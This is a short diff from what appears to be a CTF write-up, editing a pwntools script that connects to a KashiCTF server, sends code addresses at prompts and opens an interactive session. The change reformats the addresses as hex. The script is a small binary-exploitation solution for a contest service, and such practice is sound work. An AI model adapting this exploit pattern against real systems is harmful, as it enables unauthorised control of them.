@@ -268,11 +268,11 @@ p = remote(b'kashictf.iitbhucybersec.in', 15806)
 # gdb.attach(p)
 # input()
 for i in range (3):
-    p.sendlineafter(b' : ', b'40125e')
+    p.sendlineafter(b' : ', b'0x40125e')
 
 # input()
 
-p.sendlineafter(b': ', b'4011BA')
+p.sendlineafter(b': ', b'0x4011ba')
 
 p.interactive()
 ```
